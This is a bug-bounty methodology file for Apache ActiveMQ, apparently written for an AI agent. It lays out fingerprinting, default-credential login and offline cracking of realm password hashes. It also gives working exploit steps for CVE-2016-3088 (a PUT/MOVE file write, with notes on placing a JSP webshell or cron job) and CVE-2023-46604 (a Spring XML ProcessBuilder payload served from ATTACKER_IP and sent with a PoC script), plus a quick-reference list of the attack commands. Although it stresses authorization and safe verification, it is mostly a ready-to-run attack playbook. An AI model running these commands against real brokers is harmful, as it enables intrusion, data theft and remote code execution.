---
technology: "Apache ActiveMQ"
kind: bug-bounty-methodology
audience: ai-agent
family: messaging
provenance: "upstream-grounded: Apache security advisories (CVE-2023-46604, CVE-2016-3088), vulhub reproduction writeups, distro trackers. Corpus contributed 1 genuine service detection; no usable usage patterns."
---

# ActiveMQ bug bounty methodology

Target model: one JVM, two doors — web console on 8161, OpenWire on 61616 —
plus optional AMQP/MQTT/STOMP listeners. Authorization assumed throughout;
every exploit step below has a non-destructive verify variant. Companion
overview: [[activemq|ActiveMQ]].

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| OpenWire RCE (CVE-2023-46604) | ≤5.18.2 (any 5.x below the branch fixes) | yes | RCE as broker user — Critical |
| Fileserver PUT+MOVE (CVE-2016-3088) | 5.0.0–5.13.x, fileserver enabled | yes (default ≤5.11) | Arbitrary file write → webshell RCE — Critical |
| Console default creds | any version, unchanged JAAS config | n/a (credentialed) | Console access → recon, file write via APIs — High |
| MQTT anonymous plugin | custom `acl`/`plugins` config | yes if misconfigured | Topic data read/publish — Medium |
| STOMP/AMQP credential reuse | same `activemq.xml` realm | credentialed | Message stream access — Medium |

Work top-down when the version is known; otherwise Phase 0 first.

## Phase 0 — Fingerprint and version oracle

```bash
# Full listener map; each open port is a protocol door
nmap -p 8161,61616,5672,1883,61613,61614,8162 -sV 198.51.100.10
# 61616/tcp open apachemq  ActiveMQ OpenWire transport  <- conclusive for OpenWire

# Console probe: Jetty basic-auth realm on any /admin path
curl -si http://198.51.100.10:8161/admin/ | head -5
# 401 + WWW-Authenticate: Basic realm="ActiveMQRealm"  <- ActiveMQ console confirmed
```

Version oracle, in order of cost:

```bash
# 1. Credential gate first — default pair, then the login page itself
curl -si -u admin:admin http://198.51.100.10:8161/admin/
# 200: default creds live; page footer states "ActiveMQ 5.x.x ... " ID
# 401: creds changed — version still leaks on failed /admin includes in some builds

# 2. Fileserver presence = version band oracle (no auth needed)
for p in fileserver api webconsole hawtio; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" http://198.51.100.10:8161/$p/
done
# /fileserver 200/401 -> 5.0.0-5.13.x era (CVE-2016-3088 candidate)
# /hawtio    200     -> Artemis or 5.x with hawtio plugin (identify before assuming Classic)
```

Parse the version out of any console page footer (`ActiveMQ 5.17.2, ...`) and
record it: it gates both criticals. Distinguish Classic from Artemis (console
branding, `/console/auth/login` is Artemis) before applying the CVE table.

## Phase 1 — Console after auth (default or recovered credentials)

Inside `/admin` the landing page is reconnaissance gold: broker version,
uptime, JVM, all queues/topics with depth, active subscribers and connection
URLs. Items that matter next:

- **Queue browse**: `/admin/queueBrowse/<queueName>?view=rss` — message
  payloads often carry tokens, internal URLs, PII (info disclosure findings
  on their own).
- **Config read**: `/admin/xml/topics.jsp`, connection filters; the console
  user can reach `conf/` paths via API on some builds.
- **Jetty realm files** (`jetty-realms.properties`, `credentials.properties`)
  contain password hashes — crackable offline (they are often MD5 or plain).

## Phase 2 — Fileserver unauthenticated file write (CVE-2016-3088)

Applies 5.0.0–5.13.x with fileserver enabled (default-open ≤5.11.x; ships
disabled 5.12–5.13; removed 5.14.0). Mechanism: unauthenticated `PUT` of a
file into the fileserver store, then `MOVE` with a `file://` destination to
any path the broker user can write.

Safe verify — write a marker, read it back, remove it:

```bash
curl -si -X PUT --data-binary 'marker-4660' \
  http://198.51.100.10:8161/fileserver/4660test.txt
# 204 (no content) = stored

curl -si -X MOVE -H "Destination: file:///tmp/marker-4660" \
  http://198.51.100.10:8161/fileserver/4660test.txt
# 204 = arbitrary-write confirmed — this is already the Critical; stop here
# for bounty evidence. RCE variants (authorized full-tests only):
#   MOVE into webapps/admin/ as .jsp  -> GET /admin/<name>.jsp executes
#   MOVE into /etc/cron.d/ or /var/spool/cron/ -> scheduled execution
```

Expected behavior on patched/removed versions: `/fileserver/` returns 404
(5.14+) or 401/403 (5.12–5.13 default-off). Report includes both HTTP
transcripts plus the read-back proof.

## Phase 3 — OpenWire pre-auth RCE (CVE-2023-46604)

Applies to Classic 5.x below 5.15.16/5.16.7/5.17.6/5.18.3 and the legacy
OpenWire module; Artemis carries the code but no Spring gadget (no known
exploit — do not report Artemis by version alone). Pre-auth, protocol-level:
a manipulated OpenWire command names a class to instantiate with a String
argument; the broker ships Spring, so `ClassPathXmlApplicationContext` with
an attacker HTTP URL is the canonical gadget.

Non-destructive verification recipe:

```bash
# 1. Stage the application-context XML (touches nothing on target)
cat > poc.xml <<'EOF'
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="m" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg><list><value>id</value></list></constructor-arg>
  </bean>
</beans>
EOF
python3 -m http.server 8000            # serving poc.xml on ATTACKER_IP

# 2. Fire the public OpenWire PoC (several exist; all send the same
#    ClassInfo ExceptionResponse for ClassPathXmlApplicationContext)
python3 activmq_poc.py -i 198.51.100.10 -p 61616 \
    -u http://ATTACKER_IP:8000/poc.xml
```

Expected outcome: your HTTP server logs a single `GET /poc.xml` from the
target — that callback is the RCE proof; use an OOB DNS/HTTP collaborator
instead of `id` when you must not execute anything. Patched versions close
the connection / log a marshal error with no callback. Evidence: the
callback log line + target version screenshot.

## Phase 4 — Secondary doors

- **MQTT (1883)**: probe anonymous connect (`mosquitto_sub -h 198.51.100.10
  -t '#' -v` fails with auth error by default; success = anonymous plugin
  misconfiguration worth reporting).
- **STOMP/AMQP credential reuse**: try the console credentials against
  these transports — realms are frequently shared; message stream access
  follows.
- **KahaDB exposure**: if fileserver write exists, reading `data/` via
  traversal variants leaks journal contents (queued messages) — disclosure
  findings.

## Reporting notes

Both criticals are pre-auth and need only one request pair each — quote the
exact requests/responses. For the OpenWire RCE, the HTTP callback log is the
cleanest evidence (no payload executed on target beyond Spring bean init).
Severity anchors: CVSS 9.8 (2023-46604), file write (2016-3088) critical on
any writable-executable path. Cleanup: delete markers, remove staged XML.

## Appendix A — Tool map

- **nmap** (service detection, port map) — Phase 0.
- **curl** (console probes, PUT/MOVE verbs, credential tests) — Phases 0-2.
- **Public OpenWire PoC scripts** (ClassInfo ExceptionResponse senders;
  pick one, verify its gadget is the Spring XML context) — Phase 3.
- **mosquitto_sub/mosquitto_pub** (MQTT anonymous check) — Phase 4.
- Tools vault companions by name: nmap, curl, mosquitto-clients, hashcat for
  realm hashes.

## Appendix B — Quick reference

```bash
nmap -p 8161,61616 -sV 198.51.100.10                 # listener map
curl -si http://198.51.100.10:8161/admin/            # realm check
curl -si -u admin:admin http://198.51.100.10:8161/admin/   # default creds + version
curl -si -X PUT --data-binary x http://198.51.100.10:8161/fileserver/t.txt  # ≤5.13 write
curl -si -X MOVE -H "Destination: file:///tmp/x" http://198.51.100.10:8161/fileserver/t.txt
python3 activmq_poc.py -i 198.51.100.10 -p 61616 -u http://ATTACKER_IP:8000/poc.xml  # 46604
```

CVE index: 2023-46604 (OpenWire RCE, fixed 5.15.16/5.16.7/5.17.6/5.18.3) ·
2016-3088 (fileserver write, 5.0.0–5.13.x, removed 5.14.0) ·
2015-5254 (ObjectMessage client-side deserialization — requires a consuming
client, rarely bounty-relevant).
